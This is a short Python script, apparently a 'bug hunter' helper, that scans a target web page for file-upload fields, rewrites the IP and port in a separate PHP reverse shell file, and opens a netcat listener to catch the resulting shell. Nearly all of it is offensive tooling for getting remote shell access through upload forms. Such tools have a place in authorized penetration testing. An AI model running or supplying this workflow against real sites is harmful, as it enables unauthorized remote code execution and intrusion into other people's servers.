# Import necessary libraries
import os
import subprocess
import signal
import time
from colorama import Fore, Style, init
import requests
from bs4 import BeautifulSoup

# Initialize colorama for colored console output
init()

# Define custom colors for console text
BOLD_GREEN = f"{Style.BRIGHT}{Fore.GREEN}"
BOLD_RED = f"{Style.BRIGHT}{Fore.RED}"
BOLD_CYAN = f"{Style.BRIGHT}{Fore.CYAN}"

# Function to clear the console screen based on the operating system
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Function to print colored text
def print_colored(text, color=Fore.WHITE, style=Style.NORMAL):
    print(style + color + text + Style.RESET_ALL)

# Function to display the main menu and get the user's choice
def show_menu():
    clear_screen()
    print_colored("Hey Bug Hunter, Please choose:", BOLD_CYAN)
    
    print_colored("1. File Upload", BOLD_RED)
    print_colored("2. Exit", BOLD_RED)

    choice = input("Enter your choice (1 or 2): ")
    return choice

# Function for the "File Upload" menu
def file_upload_menu():
    target_url = input("Target web page URL: ")
    
    try:
        # Send an HTTP GET request to the target URL
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find all input fields of type "file" on the web page
        file_input_fields = soup.find_all('input', {'type': 'file'})
        
        if file_input_fields:
            print_colored("File upload input fields found:", BOLD_GREEN)
            for input_field in file_input_fields:
                input_name = input_field.get('name', 'No name attribute')
                print(f"- Input name: {input_name}")
            
            # Ask the user if they want to create a reverse shell payload
            upload_choice = input("Do you want to use Reverse Shell Payload? (Y or N): ")
            
            if upload_choice.lower() == "Y".lower():
                user_ip = input("Enter your IP address: ")
                user_port = input("Enter the port you want to use: ")
                # Modify the reverse shell script with the user's IP and port
                replace_ip_and_port_in_file("reverse-shell.php5", user_ip, user_port)
                # Open a netcat listener in a new terminal window
                open_netcat_listener_in_new_terminal(user_port)
                print_colored("Reverse Shell script has been created, and the listener has started in a new terminal window.", BOLD_GREEN)
            else:
                print_colored("Come Back Again, Goodbye!", BOLD_RED)
                exit(0)
        else:
            print_colored("No file upload input fields found on the target web page.", BOLD_RED)
    except requests.exceptions.RequestException as e:
        print_colored(f"Error: {e}", BOLD_RED)

# Function to replace IP and port in the reverse shell script
def replace_ip_and_port_in_file(file_path, user_ip, user_port):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    lines[48] = f"$ip = '{user_ip}';\n"
    lines[49] = f"$port = {user_port};\n"
    with open(file_path, 'w') as file:
        file.writelines(lines)

# Function to open a netcat listener in a new terminal window
def open_netcat_listener_in_new_terminal(user_port):
    subprocess.run(f"gnome-terminal -- nc -lvnp {user_port}", shell=True)

# Signal handler for Ctrl+C (SIGINT) to gracefully exit the program
def goodbye_handler(signal, frame):
    clear_screen()  # Clear the screen
    print_colored("Come Back Again, Goodbye!", BOLD_RED)
    exit(0)

# Register the Ctrl+C (SIGINT) signal handler
signal.signal(signal.SIGINT, goodbye_handler)

# Show the main menu and handle user's choice
choice = show_menu()

if choice == "1":
    file_upload_menu()
elif choice == "2":
    print_colored("Come Back Again, Goodbye!", BOLD_RED)
else:
    print_colored("Invalid choice.", BOLD_RED)
